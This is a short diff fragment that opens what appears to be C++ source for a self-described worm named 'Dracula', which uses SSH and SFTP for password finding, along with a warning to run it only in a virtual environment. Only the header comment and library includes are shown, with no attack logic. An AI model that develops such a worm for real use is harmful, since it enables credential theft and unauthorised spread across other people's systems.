@@ -1,3 +1,9 @@
+//Start Date: 24-09-2024
+//author - apocalypse9949(me)
+//description - WORM(Dracula) using SFTP and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
+//WARNING!!
+//This worm can only used in virtual env, please don't try to run this on your personal or work system
+
 #include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
 #include <libssh/sftp.h>    // SFTP library for file transfer.
 #include <iostream>         // For input-output operations
